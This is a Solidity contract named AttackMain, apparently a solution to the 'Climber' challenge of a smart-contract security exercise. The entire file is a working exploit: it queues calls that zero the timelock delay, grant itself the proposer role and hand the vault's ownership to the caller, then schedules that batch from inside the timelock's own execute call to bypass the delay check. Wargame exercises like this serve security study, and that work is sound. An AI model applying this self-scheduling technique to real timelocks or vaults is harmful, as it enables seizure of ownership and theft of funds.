// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";




contract AttackMain {
    address payable timelock;
    address payable vault;
    address owner;
    address[] targets;
    bytes[] dataElements;
    uint256[] values;
    bytes32 salt;
    constructor(address payable _timelock,address payable _vault){
        timelock = _timelock;
        vault = _vault;
        owner = msg.sender;
    }

    function attack() external{
        //abi.encodeWithSignature("withdraw(uint256)", amount)

        targets.push( timelock);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        values.push(0);

        targets.push( timelock);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"),address(this)));
        values.push(0);

        targets.push( vault);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", msg.sender));
        values.push(0);


        targets.push( address(this));

        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);

        salt = keccak256("salt");

        
        ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
    }

    function schedule() external{
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }
}